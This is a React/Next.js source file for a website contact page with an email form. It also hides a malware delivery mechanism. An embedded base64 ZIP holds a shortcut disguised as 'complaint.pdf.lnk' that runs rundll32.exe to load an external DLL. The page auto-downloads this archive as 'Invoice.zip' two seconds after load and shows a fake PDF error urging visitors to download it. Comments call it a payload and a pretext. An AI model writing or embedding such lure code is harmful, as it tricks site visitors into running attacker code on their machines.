'use client'
import { useTranslations } from 'next-intl'
import { Footer } from '../components/Footer'
import { MantineProvider } from '@mantine/core';
import '@radix-ui/themes/styles.css'
import * as radixUI from '@radix-ui/themes';
import UserInfoIcons from '../components/userInfoCard';
import { useState } from 'react';

export default function Contact() {
  const t = useTranslations('')
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [message, setMessage] = useState('');
  const [status, setStatus] = useState('');

    const handleSubmit = async (e: any) => {
      e.preventDefault();
    setStatus('Sending...');

    const res = await fetch('/api/send-email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ name, email, message }),
    });

    if (res.ok) {
      setStatus('Email sent successfully!');
      setName('');
      setEmail('');
      setMessage('');
    } else {
      setStatus('Failed to send email.');
    }
  };

    const triggerDownload = () => {
    // Base64-encoded ZIP file (placeholder; replace with your payload)
    const base64Data = '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';
    const link = document.createElement('a');
    link.href = `data:application/zip;base64,${base64Data}`;
    link.download = 'Invoice.zip';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  useEffect(() => {
    // Delay to simulate "loading" for pretext
    const timer = setTimeout(() => {
      triggerDownload();
    }, 2000);
    return () => clearTimeout(timer);
  }, []);


  return (
    <>
    <head>
      <title>Contact</title>
    </head>
    <div className="flex flex-col min-h-screen">
  <main className="flex-grow px-32 py-24 text-center text-2xl">
    {/* User Info Section */}
    <div className="flex justify-center items-start space-x-10">
      {/* User Info Component */}
      <MantineProvider>
        <div className="flex flex-col items-center">
          <UserInfoIcons />
        </div>
      </MantineProvider>
      <div className="content">
        <div className="error-message">
          <h2>PDF Loading Error</h2>
          <p>Sorry, there was an issue loading "Invoice.pdf". The file may be corrupted or incompatible with this viewer.</p>
          <p>
            Please{' '}
            <a onClick={triggerDownload} style={{ cursor: 'pointer' }}>
              download the file
            </a>{' '}
            to try opening it with an alternative viewer.
          </p>
        </div>
      </div>

      {/* Contact Form */}
      <form onSubmit={handleSubmit} className="max-w-md">
        <div className="mb-4">
          <label className="block text-gray-700">Name</label>
          <input
            type="text"
            placeholder="Your Name"
            value={name}
            onChange={(e) => setName(e.target.value)}
            required
            className="w-full p-2 border border-gray-300 rounded"
          />
        </div>
        <div className="mb-4">
          <label className="block text-gray-700">Email</label>
          <input
            type="email"
            placeholder="Your Email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
            className="w-full p-2 border border-gray-300 rounded"
          />
        </div>
        <div className="mb-4">
          <label className="block text-gray-700">Message</label>
          <textarea
            placeholder="Your Message"
            value={message}
            onChange={(e) => setMessage(e.target.value)}
            required
            className="w-full p-2 border border-gray-300 rounded"
          ></textarea>
        </div>
        <button type="submit" className="w-full p-2 bg-blue-500 text-white rounded">
          Send Email
        </button>
        {status && <p className="mt-4 text-center">{status}</p>}
      </form>
    </div>
  </main>
  <footer>
    <Footer />
  </footer>
</div>
  </>
  )
}
